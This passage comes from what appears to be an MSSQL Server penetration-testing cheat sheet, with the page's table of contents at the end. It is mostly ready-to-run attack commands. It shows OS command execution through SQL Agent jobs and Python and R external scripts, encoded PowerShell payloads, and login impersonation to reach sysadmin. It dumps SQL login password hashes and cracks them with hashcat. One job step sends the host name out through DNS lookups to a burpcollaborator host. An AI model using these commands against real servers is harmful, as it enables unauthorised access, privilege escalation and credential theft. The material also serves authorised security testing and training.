+</span></span><span style="display:flex;"><span>python3 mssqlclient.py <span style="color:#e6db74">&#39;host/username:password@10.10.10.10&#39;</span> -start -reciclador <span style="color:#e6db74">&#39;C:\windows\temp\reciclador.dll&#39;</span>
+</span></span><span style="display:flex;"><span>SQL&gt; enable_ole
+</span></span><span style="display:flex;"><span>SQL&gt; upload reciclador.dll C:\windows\temp\reciclador.dll
+</span></span></code></pre></div><h2 id="agent-jobs">
+  Agent Jobs
+  <a class="anchor" href="#agent-jobs">#</a>
+</h2>
+<ul>
+<li>The execution takes place with privileges of the <strong>SQL Server Agent service account</strong> if a proxy account is not configured.</li>
+<li>:warning: Require <strong>sysadmin</strong> or <strong>SQLAgentUserRole</strong>, <strong>SQLAgentReaderRole</strong>, and <strong>SQLAgentOperatorRole</strong> roles to create a job.</li>
+</ul>
+<h3 id="execute-commands-through-sql-agent-job-service">
+  Execute commands through SQL Agent Job service
+  <a class="anchor" href="#execute-commands-through-sql-agent-job-service">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell e &lt;base64encodedscript&gt;&#34;</span> -Verbose
+</span></span><span style="display:flex;"><span>Subsystem Options<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">–</span>Subsystem CmdExec
+</span></span><span style="display:flex;"><span>-SubSystem PowerShell
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">–</span>Subsystem VBScript
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">–</span>Subsystem Jscript
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>USE msdb; 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> dbo.sp_add_job <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_add_jobstep <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>, <span style="color:#f92672">@</span>step_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_name1&#39;</span>, <span style="color:#f92672">@</span>subsystem <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;PowerShell&#39;</span>, <span style="color:#f92672">@</span>command <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;$name=$env:COMPUTERNAME[10];nslookup &#34;$name.redacted.burpcollaborator.net&#34;&#39;</span>, <span style="color:#f92672">@</span>retry_attempts <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">@</span>retry_interval <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span> ;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> dbo.sp_add_jobserver <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> dbo.sp_start_job N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- delete
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">EXEC</span> dbo.sp_delete_job <span style="color:#f92672">@</span>job_name <span style="color:#f92672">=</span> N<span style="color:#e6db74">&#39;test_powershell_job1&#39;</span>;
+</span></span></code></pre></div><h3 id="list-all-jobs">
+  List All Jobs
+  <a class="anchor" href="#list-all-jobs">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>SELECT job_id, [<span style="color:#66d9ef">name</span>] FROM msdb.dbo.sysjobs;
+</span></span><span style="display:flex;"><span>SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id
+</span></span><span style="display:flex;"><span>Get-SQLAgentJob -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -username sa -Password Password1234 -Verbose
+</span></span></code></pre></div><h2 id="external-scripts">
+  External Scripts
+  <a class="anchor" href="#external-scripts">#</a>
+</h2>
+<p>:warning: You need to enable <strong>external scripts</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>sp_configure <span style="color:#e6db74">&#39;external scripts enabled&#39;</span>, <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>RECONFIGURE;
+</span></span></code></pre></div><h2 id="python">
+  Python:
+  <a class="anchor" href="#python">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EXEC sp_execute_external_script @language =N<span style="color:#e6db74">&#39;Python&#39;</span>,@script=N<span style="color:#e6db74">&#39;import subprocess p = subprocess.Popen(&#34;cmd.exe /c whoami&#34;, stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &#34;utf-8&#34;)])&#39;</span>
+</span></span><span style="display:flex;"><span>WITH RESULT SETS (([<span style="color:#66d9ef">cmd_out</span>] nvarchar(max)))
+</span></span></code></pre></div><h2 id="r">
+  R
+  <a class="anchor" href="#r">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Command <span style="color:#e6db74">&#34;powershell -e &lt;base64encodedscript&gt;&#34;</span> -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EXEC sp_execute_external_script @language=N<span style="color:#e6db74">&#39;R&#39;</span>,@script=N<span style="color:#e6db74">&#39;OutputDataSet &lt;- data.frame(system(&#34;cmd.exe /c dir&#34;,intern=T))&#39;</span>
+</span></span><span style="display:flex;"><span>WITH RESULT SETS (([<span style="color:#66d9ef">cmd_out</span>] text));
+</span></span><span style="display:flex;"><span>GO
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@script=N<span style="color:#e6db74">&#39;OutputDataSet &lt;-data.frame(shell(&#34;dir&#34;,intern=T))&#39;</span>
+</span></span></code></pre></div><h2 id="audit-checks">
+  Audit Checks
+  <a class="anchor" href="#audit-checks">#</a>
+</h2>
+<h3 id="find-and-exploit-impersonation-opportunities">
+  Find and exploit impersonation opportunities
+  <a class="anchor" href="#find-and-exploit-impersonation-opportunities">#</a>
+</h3>
+<ul>
+<li>Impersonate as: <code>EXECUTE AS LOGIN = 'sa'</code></li>
+<li>Impersonate <code>dbo</code> with DB_OWNER
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> is_member(<span style="color:#e6db74">&#39;db_owner&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">execute</span> <span style="color:#66d9ef">as</span> <span style="color:#66d9ef">user</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;dbo&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">SELECT</span> is_srvrolemember(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
+</span></span></code></pre></div></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Exploit -Verbose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># impersonate sa account</span>
+</span></span><span style="display:flex;"><span>powerpick Get-SQLQuery -Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> -Query <span style="color:#e6db74">&#34;EXECUTE AS LOGIN = &#39;sa&#39;; SELECT IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&#34;</span> -Verbose -Debug
+</span></span></code></pre></div><h2 id="find-databases-that-have-been-configured-as-trustworthy">
+  Find databases that have been configured as trustworthy
+  <a class="anchor" href="#find-databases-that-have-been-configured-as-trustworthy">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>SQLAuditPrivTrustworthy <span style="color:#f92672">-</span>Instance <span style="color:#e6db74">&#34;&lt;DBSERVERNAME\DBInstance&gt;&#34;</span> <span style="color:#f92672">-</span>Exploit <span style="color:#f92672">-</span><span style="color:#66d9ef">Verbose</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name <span style="color:#66d9ef">as</span> database_name, SUSER_NAME(owner_sid) <span style="color:#66d9ef">AS</span> database_owner, is_trustworthy_on <span style="color:#66d9ef">AS</span> TRUSTWORTHY <span style="color:#66d9ef">from</span> sys.databases
+</span></span></code></pre></div><blockquote>
+<p>The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Invoke-SQLAuditPrivXpDirtree
+</span></span><span style="display:flex;"><span>Invoke-SQLUncPathInjection
+</span></span><span style="display:flex;"><span>Invoke-SQLAuditPrivXpFileexist
+</span></span></code></pre></div><h2 id="manual-sql-server-queries">
+  Manual SQL Server Queries
+  <a class="anchor" href="#manual-sql-server-queries">#</a>
+</h2>
+<h3 id="query-current-user--determine-if-the-user-is-a-sysadmin">
+  Query Current User &amp; determine if the user is a sysadmin
+  <a class="anchor" href="#query-current-user--determine-if-the-user-is-a-sysadmin">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> suser_sname()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#66d9ef">system_user</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">select</span> is_srvrolemember(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
+</span></span></code></pre></div><h3 id="current-role">
+  Current Role
+  <a class="anchor" href="#current-role">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#66d9ef">user</span>
+</span></span></code></pre></div><h3 id="current-db">
+  Current DB
+  <a class="anchor" href="#current-db">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> db_name()
+</span></span></code></pre></div><h3 id="list-all-tables">
+  List all tables
+  <a class="anchor" href="#list-all-tables">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">from</span> information_schema.tables
+</span></span></code></pre></div><h3 id="list-all-databases">
+  List all databases
+  <a class="anchor" href="#list-all-databases">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> name <span style="color:#66d9ef">from</span> master..sysdatabases
+</span></span></code></pre></div><h3 id="all-logins-on-server">
+  All Logins on Server
+  <a class="anchor" href="#all-logins-on-server">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> sys.server_principals <span style="color:#66d9ef">where</span> type_desc <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;SERVER_ROLE&#39;</span>
+</span></span></code></pre></div><h3 id="all-database-users-for-a-database">
+  All Database Users for a Database
+  <a class="anchor" href="#all-database-users-for-a-database">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> sys.database_principals <span style="color:#66d9ef">where</span> type_desc <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;database_role&#39;</span>;
+</span></span></code></pre></div><h3 id="list-all-sysadmins">
+  List All Sysadmins
+  <a class="anchor" href="#list-all-sysadmins">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name,type_desc,is_disabled <span style="color:#66d9ef">FROM</span> sys.server_principals <span style="color:#66d9ef">WHERE</span> IS_SRVROLEMEMBER (<span style="color:#e6db74">&#39;sysadmin&#39;</span>,name) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="list-all-database-roles">
+  List All Database Roles
+  <a class="anchor" href="#list-all-database-roles">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> DB1.name <span style="color:#66d9ef">AS</span> DatabaseRoleName,
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">isnull</span> (DB2.name, <span style="color:#e6db74">&#39;No members&#39;</span>) <span style="color:#66d9ef">AS</span> DatabaseUserName
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span> sys.database_role_members <span style="color:#66d9ef">AS</span> DRM
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">RIGHT</span> <span style="color:#66d9ef">OUTER</span> <span style="color:#66d9ef">JOIN</span> sys.database_principals <span style="color:#66d9ef">AS</span> DB1
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ON</span> DRM.role_principal_id <span style="color:#f92672">=</span> DB1.principal_id
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">LEFT</span> <span style="color:#66d9ef">OUTER</span> <span style="color:#66d9ef">JOIN</span> sys.database_principals <span style="color:#66d9ef">AS</span> DB2
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ON</span> DRM.member_principal_id <span style="color:#f92672">=</span> DB2.principal_id
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">WHERE</span> DB1.<span style="color:#66d9ef">type</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;R&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> DB1.name;
+</span></span></code></pre></div><h3 id="effective-permissions-from-the-server">
+  Effective Permissions from the Server
+  <a class="anchor" href="#effective-permissions-from-the-server">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> fn_my_permissions(<span style="color:#66d9ef">null</span>, <span style="color:#e6db74">&#39;server&#39;</span>);
+</span></span></code></pre></div><h3 id="effective-permissions-from-the-database">
+  Effective Permissions from the Database
+  <a class="anchor" href="#effective-permissions-from-the-database">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> fn_dp1my_permissions(<span style="color:#66d9ef">NULL</span>, <span style="color:#e6db74">&#39;DATABASE&#39;</span>);
+</span></span></code></pre></div><h3 id="find-sql-server-logins-which-can-be-impersonated-for-the-current-database">
+  Find SQL Server Logins Which can be Impersonated for the Current Database
+  <a class="anchor" href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#66d9ef">distinct</span> b.name
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">from</span> sys.server_permissions a
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">inner</span> <span style="color:#66d9ef">join</span> sys.server_principals b
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">on</span> a.grantor_principal_id <span style="color:#f92672">=</span> b.principal_id
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">where</span> a.permission_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;impersonate&#39;</span>
+</span></span></code></pre></div><h3 id="exploiting-impersonation">
+  Exploiting Impersonation
+  <a class="anchor" href="#exploiting-impersonation">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;adminuser&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> ORIGINAL_LOGIN()
+</span></span></code></pre></div><h3 id="exploiting-nested-impersonation">
+  Exploiting Nested Impersonation
+  <a class="anchor" href="#exploiting-nested-impersonation">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;stduser&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span> <span style="color:#66d9ef">AS</span> LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sa&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> IS_SRVROLEMEMBER(<span style="color:#e6db74">&#39;sysadmin&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> ORIGINAL_LOGIN()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">SYSTEM_USER</span>
+</span></span></code></pre></div><h3 id="mssql-accounts-and-hashes">
+  MSSQL Accounts and Hashes
+  <a class="anchor" href="#mssql-accounts-and-hashes">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>MSSQL <span style="color:#ae81ff">2000</span>:
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name, password <span style="color:#66d9ef">FROM</span> master..sysxlogins
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name, master.dbo.fn_varbintohexstr(password) <span style="color:#66d9ef">FROM</span> master..sysxlogins (Need <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">convert</span> <span style="color:#66d9ef">to</span> hex <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">return</span> hashes <span style="color:#66d9ef">in</span> MSSQL error message <span style="color:#f92672">/</span> <span style="color:#66d9ef">some</span> <span style="color:#66d9ef">version</span> <span style="color:#66d9ef">of</span> query analyzer.)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MSSQL <span style="color:#ae81ff">2005</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name, password_hash <span style="color:#66d9ef">FROM</span> master.sys.sql_logins
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">+</span> master.sys.fn_varbintohexstr(password_hash) <span style="color:#66d9ef">from</span> master.sys.sql_logins
+</span></span></code></pre></div><p>Then crack passwords using Hashcat : <code>hashcat -m 1731 -a 0 mssql_hashes_hashcat.txt /usr/share/wordlists/rockyou.txt --force</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#ae81ff">131</span>	MSSQL (<span style="color:#ae81ff">2000</span>)	0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">132</span>	MSSQL (<span style="color:#ae81ff">2005</span>)	0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1731</span>	MSSQL (<span style="color:#ae81ff">2012</span>, <span style="color:#ae81ff">2014</span>)	0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://medium.com/@D00MFist/powerupsql-cheat-sheet-sql-server-queries-40e1c418edc3">PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt</a></li>
+<li>
+  <a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">PowerUpSQL Cheat Sheet - Scott Sutherland</a></li>
+<li>
+  <a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017</a></li>
+<li>
+  <a href="https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution">MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/mssql_server_cheatsheet.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#mssql-server">MSSQL Server</a>
+      <ul>
+        <li><a href="#identify-instances-and-databases">Identify Instances and Databases</a>
+          <ul>
+            <li><a href="#discover-local-sql-server-instances">Discover Local SQL Server Instances</a></li>
+            <li><a href="#discover-domain-sql-server-instances">Discover Domain SQL Server Instances</a></li>
+            <li><a href="#discover-remote-sql-server-instances">Discover Remote SQL Server Instances</a></li>
+            <li><a href="#identify-encrypted-databases">Identify Encrypted databases</a></li>
+            <li><a href="#version-query">Version Query</a></li>
+          </ul>
+        </li>
+        <li><a href="#identify-sensitive-information">Identify Sensitive Information</a>
+          <ul>
+            <li><a href="#get-tables-from-a-specific-database">Get Tables from a Specific Database</a></li>
+            <li><a href="#gather-5-entries-from-each-column">Gather 5 Entries from Each Column</a></li>
+            <li><a href="#gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</a></li>
+            <li><a href="#dump-common-information-from-server-to-files">Dump common information from server to files</a></li>
+          </ul>
+        </li>
+        <li><a href="#linked-database">Linked Database</a>
+          <ul>
+            <li><a href="#find-trusted-link">Find Trusted Link</a></li>
+            <li><a href="#execute-query-through-the-link">Execute Query Through The Link</a></li>
+            <li><a href="#crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</a></li>
+            <li><a href="#crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</a></li>
+            <li><a href="#query-version-of-linked-database">Query Version of Linked Database</a></li>
+            <li><a href="#execute-procedure-on-linked-database">Execute Procedure on Linked Database</a></li>
+            <li><a href="#determine-names-of-linked-databases">Determine Names of Linked Databases</a></li>
+            <li><a href="#determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</a></li>
+            <li><a href="#gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</a></li>
+            <li><a href="#gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</a></li>
+          </ul>
+        </li>
+        <li><a href="#command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</a></li>
+        <li><a href="#extended-stored-procedure">Extended Stored Procedure</a>
+          <ul>
+            <li><a href="#add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</a></li>
+          </ul>
+        </li>
+        <li><a href="#clr-assemblies">CLR Assemblies</a>
+          <ul>
+            <li><a href="#execute-commands-using-clr-assembly">Execute commands using CLR assembly</a></li>
+            <li><a href="#manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</a></li>
+          </ul>
+        </li>
+        <li><a href="#ole-automation">OLE Automation</a>
+          <ul>
